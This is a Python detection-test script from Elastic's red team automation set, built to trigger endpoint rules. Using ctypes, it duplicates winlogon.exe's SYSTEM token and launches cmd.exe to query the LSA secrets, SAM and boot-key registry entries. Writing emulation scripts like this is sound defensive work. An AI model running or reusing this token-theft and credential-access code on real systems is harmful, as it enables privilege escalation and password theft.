# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

from . import common
from . import RtaMetadata



metadata = RtaMetadata(
    uuid="59329aa6-852a-44d0-9b24-322fe4fbdad0",
    platforms=["windows"],
    endpoint=[
    {'rule_id': 'c5ee8453-bc89-42e7-a414-1ba4bec85119', 'rule_name': 'Suspicious Access to LSA Secrets Registry'},
    {'rule_id': 'b6e8c090-f0ec-4c4c-af00-55ac2a9f9b41', 'rule_name': 'Security Account Manager (SAM) Registry Access'},
    {'rule_id': '2afd9e7f-99e0-4a4d-a6e3-9e9db730f63b', 'rule_name': 'Privilege Escalation via EXTENDED STARTUPINFO'},
    {'rule_id': '46de65b8-b873-4ae7-988d-12dcdc6fa605', 'rule_name': 'Potential Privilege Escalation via Token Impersonation'},
    ],
    siem=[],
    techniques=["T1134", "T1003"],
)

@common.requires_os(*metadata.platforms)
def main():
    import ctypes
    from ctypes import byref, windll, wintypes

    hprocess = wintypes.HANDLE()
    hsystem_token = wintypes.HANDLE()
    hsystem_token_dup = wintypes.HANDLE()

    PROCESS_QUERY_LIMITED_INFORMATION = 0x1000
    TOKEN_IMPERSONATE = 0x00000004
    TOKEN_DUPLICATE = 0x00000002
    SecurityImpersonation = 0x2
    TokenPrimary = 0x1
    LOGON_WITH_PROFILE = 0x1
    TOKEN_ALL_ACCESS = 0xf01ff
    LPBYTE = ctypes.POINTER(wintypes.BYTE)

    class PROCESS_INFORMATION(ctypes.Structure):
        _pack_ = 1
        _fields_ = [
            ('hProcess', wintypes.HANDLE),
            ('hThread', wintypes.HANDLE),
            ('dwProcessId', wintypes.DWORD),
            ('dwThreadId', wintypes.DWORD),
        ]

    class STARTUPINFO(ctypes.Structure):
        __slots__ = ()
        _fields_ = (('cb', wintypes.DWORD),
                    ('lpReserved', wintypes.LPWSTR),
                    ('lpDesktop', wintypes.LPWSTR),
                    ('lpTitle', wintypes.LPWSTR),
                    ('dwX', wintypes.DWORD),
                    ('dwY', wintypes.DWORD),
                    ('dwXSize', wintypes.DWORD),
                    ('dwYSize', wintypes.DWORD),
                    ('dwXCountChars', wintypes.DWORD),
                    ('dwYCountChars', wintypes.DWORD),
                    ('dwFillAttribute', wintypes.DWORD),
                    ('dwFlags', wintypes.DWORD),
                    ('wShowWindow', wintypes.WORD),
                    ('cbReserved2', wintypes.WORD),
                    ('lpReserved2', LPBYTE),
                    ('hStdInput', wintypes.HANDLE),
                    ('hStdOutput', wintypes.HANDLE),
                    ('hStdError', wintypes.HANDLE))

    OpenProcess = windll.kernel32.OpenProcess
    OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
    OpenProcess.restype = wintypes.HANDLE

    OpenProcessToken = windll.kernel32.OpenProcessToken
    OpenProcessToken.argtypes = [wintypes.HANDLE, wintypes.DWORD, wintypes.LPCVOID]
    OpenProcessToken.restype = wintypes.BOOL

    DuplicateTokenEx = windll.advapi32.DuplicateTokenEx
    DuplicateTokenEx.restype = wintypes.BOOL
    DuplicateTokenEx.argtypes = [
        wintypes.HANDLE,                 # TokenHandle
        wintypes.DWORD,                  # dwDesiredAccess
        wintypes.LPCVOID,                # lpTokenAttributes
        wintypes.DWORD,                  # ImpersonationLevel
        wintypes.DWORD,                  # TokenType
        wintypes.HANDLE,                 # phNewToken
    ]

    CreateProcessWithTokenW = windll.advapi32.CreateProcessWithTokenW
    CreateProcessWithTokenW.argtypes = [
        wintypes.HANDLE,  # hToken
        wintypes.DWORD,  # dwLogonFlags
        wintypes.LPCWSTR,  # lpApplicationName
        wintypes.LPCVOID,  # lpCommandLine
        wintypes.DWORD,  # dwCreationFlags
        wintypes.LPCVOID,  # lpEnvironment
        wintypes.LPCVOID,  # lpCurrentDirectory
        wintypes.LPCVOID,  # lpStartupInfo
        wintypes.LPCVOID,  # lpProcessInformation
    ]
    CreateProcessWithTokenW.restype = wintypes.BOOL

    CloseHandle = windll.kernel32.CloseHandle
    CloseHandle.argtypes = [wintypes.HANDLE]
    CloseHandle.restype = wintypes.BOOL

    # Duplicate winlogon.exe System Token
    hprocess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, 0, common.getppid("winlogon.exe"))
    OpenProcessToken(hprocess, TOKEN_DUPLICATE | TOKEN_IMPERSONATE, byref(hsystem_token))
    DuplicateTokenEx(hsystem_token, TOKEN_ALL_ACCESS, 0, SecurityImpersonation, TokenPrimary, byref(hsystem_token_dup))

    # create process with winlogon system token duplicate to query specific sensitive registry keys using reg.exe
    process_info = PROCESS_INFORMATION()
    startup_info = STARTUPINFO()
    cmdline = u" /c reg.exe query hklm\\security\\policy\\secrets && reg.exe query hklm\\SAM\\SAM\\Domains\\Account && reg.exe query hklm\\SYSTEM\\ControlSet001\\Control\\Lsa\\JD && reg.exe query hklm\\SYSTEM\\ControlSet001\\Control\\Lsa\\Skew1"
    res = CreateProcessWithTokenW(hsystem_token_dup, LOGON_WITH_PROFILE, u"C:\\Windows\\System32\\cmd.exe", cmdline, 0, 0, 0, byref(startup_info), byref (process_info))

    # check process creation result
    if res == 1 :
       common.log("Executed RTA")
    else :
       common.log("Failed to execute RTA")

    # Close all the handles
    common.log("Closed all Handles")
    CloseHandle(hsystem_token_dup)
    CloseHandle(hsystem_token)
    CloseHandle(hprocess)

if __name__ == "__main__":
    exit(main())
